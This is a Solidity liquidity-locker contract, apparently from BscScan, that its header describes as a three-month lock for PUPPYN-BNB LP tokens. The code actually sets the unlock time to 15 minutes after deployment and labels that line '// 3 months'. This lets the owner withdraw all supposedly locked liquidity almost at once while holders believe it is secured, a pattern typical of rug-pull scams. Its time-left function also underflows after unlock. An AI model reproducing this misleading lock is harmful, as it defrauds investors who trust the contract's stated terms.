/**
 *Submitted for verification at BscScan.com on 2021-10-09
*/

/**
 *Submitted for verification at BscScan.com on 2021-04-19
*/

// Locker for PUPPYN-BNB LP Tokens
// 3 MONTH for Liquidity Lock


pragma solidity ^0.4.26;

contract _ERC20Basic {
  function balanceOf(address _owner) public returns (uint256 balance);
  function transfer(address to, uint256 value) public returns (bool);
}


contract LPLocker  {
    address owner;

    address tokenAddress = 0xA1E9A3504e421Bc65938b1f2ce90fF906DF56eb6; 
    uint256 unlockUnix = now + 15 minutes; // 3 months

    _ERC20Basic token = _ERC20Basic(tokenAddress);

    constructor() public {
        owner = msg.sender;
    }

    function unlockLPTokens() public {
        require(owner == msg.sender, "You are not owner");
        require( now > unlockUnix, "Still locked");
        token.transfer(owner, token.balanceOf(address(this)));
    }

    //Control
    function getLockAmount() public view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function getTokenAddress()  public view returns (address) {
        return tokenAddress;
    }

    function getUnlockTimeLeft() public view returns (uint) {
        return unlockUnix - now;
    }
}